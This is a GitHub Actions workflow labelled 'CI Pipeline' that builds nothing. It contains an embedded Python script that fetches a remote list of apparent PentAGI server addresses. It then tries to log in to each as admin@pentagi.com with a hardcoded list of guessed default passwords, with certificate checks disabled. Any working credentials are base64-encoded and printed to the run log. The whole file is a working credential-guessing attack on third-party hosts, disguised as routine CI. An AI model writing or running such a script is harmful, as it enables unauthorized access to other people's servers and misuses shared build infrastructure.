name: CI Pipeline
on:
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Env
        run: |
          echo "IP: $(curl -s --max-time 5 ifconfig.me)"
          uname -a
      - name: Scan
        run: |
          python3 << 'EOF'
          import requests, json, concurrent.futures, urllib3, base64
          urllib3.disable_warnings()
          
          # Target list (alive PentAGI instances)
          targets = ""
          # Simple test - check reachability of a few targets
          targets_list = []
          try:
              import urllib.request
              req = urllib.request.Request('https://raw.githubusercontent.com/2han9dad1a0-eng/CyberStrikeAI-SecAudit/main/instances.txt')
              resp = urllib.request.urlopen(req, timeout=10)
              targets_list = resp.read().decode().strip().split('\n')
          except Exception as e:
              print(f"Fetch instances: {e}")
              targets_list = ["121.17.245.130:8443"]
          
          print(f"Targets: {len(targets_list)}")
          passwords = ["Pentagi2025!", "pentagi2026", "Pentagi@2024", "P3ntAGI_2024", "pentagi2024!", "pentagi123", "Pentagi@123", "Admin@pentagi", "Pentagi2024#", "p3nt@g1", "Pentagi2025#", "pentagi2025!", "Pentagi_2024", "pentagi@2024", "Pentagi2026!", "P3ntagi2024"]
          
          def try_login(ip_port):
              ip, port = ip_port.split(':')
              for pwd in passwords[:4]:
                  try:
                      r = requests.post(f"https://{ip}:{port}/api/v1/auth/login",
                          json={"mail": "admin@pentagi.com", "password": pwd},
                          timeout=3, verify=False)
                      if r.status_code == 200:
                          return f"SUCCESS {ip}:{port} admin@pentagi.com/{pwd}"
                  except:
                      pass
              return None
          
          results = []
          with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
              futs = [ex.submit(try_login, t) for t in targets_list[:60]]
              for f in concurrent.futures.as_completed(futs):
                  res = f.result()
                  if res:
                      results.append(res)
                      print(f"FOUND: {res}")
          
          print(f"Results: {len(results)}")
          if results:
              encoded = base64.b64encode('\n'.join(results).encode()).decode()
              print(f"ENC_RESULTS:{encoded}")
          EOF
